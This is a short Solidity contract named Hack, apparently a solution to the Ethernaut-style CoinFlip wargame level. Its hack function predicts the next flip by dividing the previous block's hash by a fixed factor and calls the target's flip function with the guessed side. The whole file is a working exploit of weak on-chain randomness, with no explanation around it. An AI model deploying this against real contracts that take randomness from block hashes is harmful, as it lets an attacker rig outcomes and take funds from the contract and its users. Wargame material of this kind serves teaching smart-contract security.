pragma solidity ^0.6.0;
// SPDX-License-Identifier: MIT


interface CoinFlip{
    function flip(bool _guess) external returns (bool);
}

contract Hack{
    CoinFlip coin_flip;
    // Creating an object of interface
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public side;

    constructor(address _addr) public{
        coin_flip = CoinFlip(_addr);
    }

    function hack() public{
        uint256 blockValue = uint256(blockhash(block.number -1));
        uint256 coinFlip = uint256(uint256(blockValue)/ FACTOR);
        side = coinFlip == 1 ? true : false;
        coin_flip.flip(side);
    }

}